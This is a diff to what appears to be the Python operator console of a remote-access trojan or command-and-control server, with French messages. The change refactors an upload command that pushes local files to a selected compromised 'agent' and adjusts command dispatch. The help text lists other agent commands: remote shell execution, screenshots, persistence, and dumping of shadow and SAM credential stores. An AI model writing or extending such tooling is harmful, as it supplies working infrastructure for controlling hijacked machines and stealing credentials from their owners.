@@ -210,7 +210,7 @@ def cmd_help():
   agents / use <id> / kill <id> / exit
   shell <cmd> / screenshot / sysinfo / ip / list_users
   persistence / shadow / list_home / sam / registry
-  upload <fichier_local> <dest_distante>
+  upload <fichier_local> [dossier_distant]
   broadcast <commande> [args]
 """)
 
@@ -253,6 +253,32 @@ def cmd_kill(arg):
     remove_agent(aid)
     print(f"Agent #{aid} déconnecté")
 
+def cmd_upload(arg):
+    if not current_agent:
+        print("Aucun agent sélectionné (use <id>)")
+        return
+    parts = arg.split(maxsplit=1)
+    local_path = parts[0]
+    remote_dest = parts[1] if len(parts) > 1 else "."
+    if not os.path.isfile(local_path):
+        print(f"Fichier introuvable: {local_path}")
+        return
+    filename = os.path.basename(local_path)
+    with open(local_path, "rb") as f:
+        blob = f.read()
+    try:
+        with current_agent.lock:
+            send_msg(current_agent.sock, {"cmd": "upload", "dest": remote_dest, "filename": filename})
+            current_agent.sock.sendall(struct.pack(">I", len(blob)) + blob)
+            resp = recv_response(current_agent)
+    except (ConnectionError, OSError) as e:
+        print(f"Erreur: {e}")
+        return
+    if resp:
+        afficher_reponse(resp)
+    print()
+
+
 def cmd_screenshot():
     #Envoie screenshot et sauvegarde le png
     if not current_agent:
@@ -276,34 +302,6 @@ def cmd_screenshot():
     with open(filename, "wb") as f:
         f.write(png_data)
     print(f"Screenshot sauvegardé: {filename} ({len(png_data)} octets)")
-
-
-def cmd_upload(arg):
-    if not current_agent:
-        print("Aucun agent sélectionné (use <id>)")
-        return
-    parts = arg.split(maxsplit=1)
-    if len(parts) < 2:
-        print("Usage: upload <fichier_local> <dest_distante>")
-        return
-    local_path, remote_dest = parts
-    if not os.path.isfile(local_path):
-        print(f"Fichier introuvable: {local_path}")
-        return
-    with open(local_path, "rb") as f:
-        file_data = f.read()
-    filename = os.path.basename(local_path)
-    try:
-        with current_agent.lock:
-            send_msg(current_agent.sock, {"cmd": "upload", "dest": remote_dest, "filename": filename})
-            current_agent.sock.sendall(struct.pack(">I", len(file_data)) + file_data)
-            resp = recv_response(current_agent)
-    except (ConnectionError, OSError) as e:
-        print(f"Erreur: {e}")
-        return
-    if resp:
-        afficher_reponse(resp)
-    print()
 
 
 def cmd_broadcast(arg):
@@ -383,10 +381,13 @@ def main():
                 print("Usage: shell <commande>")
             else:
                 send_to_agent({"cmd": "shell", "command": arg}, label=f"shell: {arg}")
+        elif cmd == "upload":
+            if not arg:
+                print("Usage: upload <fichier_local> [dossier_distant]")
+            else:
+                cmd_upload(arg)
         elif cmd == "screenshot":
             cmd_screenshot()
-        elif cmd == "upload":
-            cmd_upload(arg)
         elif cmd == "broadcast":
             cmd_broadcast(arg)
         elif cmd in ("sysinfo", "list_users", "ip", "persistence",
